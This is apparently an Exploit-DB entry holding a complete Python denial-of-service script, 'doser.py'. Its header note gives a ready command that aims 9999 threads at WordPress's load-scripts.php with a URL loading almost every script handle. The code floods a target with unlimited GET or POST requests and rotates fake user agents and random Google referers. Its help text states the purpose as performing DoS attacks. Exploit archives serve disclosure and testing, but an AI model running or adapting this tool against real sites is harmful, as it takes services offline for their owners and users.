# EDB Note: python doser.py -g 'http://localhost/wp-admin/load-scripts.php?c=1&load%5B%5D=eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter&ver=4.9' -t 9999


import requests
import sys
import threading
import random
import re
import argparse

host=''
headers_useragents=[]
request_counter=0
printedMsgs = []

def printMsg(msg):
	if msg not in printedMsgs:
		print "\n"+msg + " after %i requests" % request_counter
	printedMsgs.append(msg)

def useragent_list():
	global headers_useragents
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	return(headers_useragents)
	
def randomString(size):
	out_str = ''
	for i in range(0, size):
		a = random.randint(65, 90)
		out_str += chr(a)
	return(out_str)

def initHeaders():
	useragent_list()
	global headers_useragents, additionalHeaders
	headers = {
				'User-Agent': random.choice(headers_useragents),
				'Cache-Control': 'no-cache',
				'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
				'Referer': "http://www.google.com/?q=" + randomString(random.randint(5,10)),
				'Keep-Alive': random.randint(110,120),
				'Connection': 'keep-alive'
				}

	if additionalHeaders:
		for header in additionalHeaders:
			headers.update({header.split(":")[0]:header.split(":")[1]})
	return headers

def handleStatusCodes(status_code):
	global request_counter
	sys.stdout.write("\rNumber of requests sent %i" % request_counter)
	sys.stdout.flush()
	if status_code == 429:
			printMsg("You have been throttled")
	if status_code == 500:
		printedMsg("Status code 500 received")

def sendGET(url):
	global request_counter
	headers = initHeaders()
	try:
		request_counter+=1
		request = requests.get(url, headers=headers)
		handleStatusCodes(request.status_code)

	except e:
		pass

def sendPOST(url, payload):
	global request_counter
	headers = initHeaders()
	try:
		request_counter+=1
		if payload:
			request = requests.post(url, data=payload, headers=headers)
		else:
			request = requests.post(url, headers=headers)
		handleStatusCodes(request.status_code)
		
	except e:
		pass

class SendGETThread(threading.Thread):
	def run(self):
		try:
			while True:
				global url
				sendGET(url)
		except:
			pass

class SendPOSTThread(threading.Thread):
	def run(self):
		try:
			while True:
				global url, payload
				sendPOST(url, payload)
		except:
			pass


# TODO:
# check if the site stop responding and alert

def main(argv):
	parser = argparse.ArgumentParser(description='Sending unlimited amount of requests in order to perform DoS attacks. Written by Barak Tawily')
	parser.add_argument('-g', help='Specify GET request. Usage: -g \'<url>\'')
	parser.add_argument('-p', help='Specify POST request. Usage: -p \'<url>\'')
	parser.add_argument('-d', help='Specify data payload for POST request', default=None)
	parser.add_argument('-ah', help='Specify addtional header/s. Usage: -ah \'Content-type: application/json\' \'User-Agent: Doser\'', default=None, nargs='*')
	parser.add_argument('-t', help='Specify number of threads to be used', default=500, type=int)
	args = parser.parse_args()

	global url, payload, additionalHeaders
	additionalHeaders = args.ah
	payload = args.d

	if args.g:
		url = args.g
		for i in range(args.t):
			t = SendGETThread()
			t.start()

	if args.p:
		url = args.p
		for i in range(args.t):
			t = SendPOSTThread()
			t.start()
	
	if len(sys.argv)==1:
		parser.print_help()
		exit()
	
if __name__ == "__main__":
   main(sys.argv[1:])
